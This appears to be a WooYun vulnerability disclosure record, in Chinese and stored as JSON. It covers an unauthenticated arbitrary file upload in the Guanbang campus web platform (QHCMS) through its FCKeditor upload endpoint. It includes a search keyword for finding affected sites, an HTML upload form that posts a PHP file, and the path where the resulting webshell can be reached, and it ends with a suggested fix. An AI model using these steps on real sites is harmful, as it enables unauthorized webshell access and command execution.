{"id": 58653, "wybug_id": "wooyun-2014-050491", "wybug_title": "冠邦校园网平台(QHCMS)任意文件上传漏洞", "wybug_corp": "南京冠邦网络技术有限公司", "wybug_author": "GreenVine", "wybug_date": "2014-02-12 12:22", "wybug_open_date": "2014-05-13 12:22", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传内容未检查", "文件上传漏洞", "任意", "文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-05-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 冠邦校园网平台的文件上传部分存在绕过漏洞，允许未登录的用户直接上传可执行文件。 详细说明：  http://www.topnt.cn/1. 以“qhcmsadmin”为关键字，搜索使用冠邦校园网平台的网站。2. 将以下代码保存为.html，手动POST一个.php文件：\n<form enctype=\"multipart/form-data\" action=\"http://www.EXAMPLE.com/editor/fckeditor/filemanager/upload/php/upload.php\" method=\"post\"> <input name=\"FCKeditor_File\" type=\"file\"> <input type=\"submit\" value=\"Upload\"></form>\n\n\n3. 上传成功则保存在http://www.EXAMPLE.com/images/stories/editorupload/下，使用原始文件名访问即可拿到Webshell。\n\n4. 该平台提供了一键环境部署安装包，但没有做PHP安全限制，导致可以执行任意CMD。\n\n   漏洞证明：  \n\n   修复方案：  FCKEditor增加用户登录状态判断，以及禁止可执行文件的上传。   版权声明：转载请注明来源 GreenVine@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}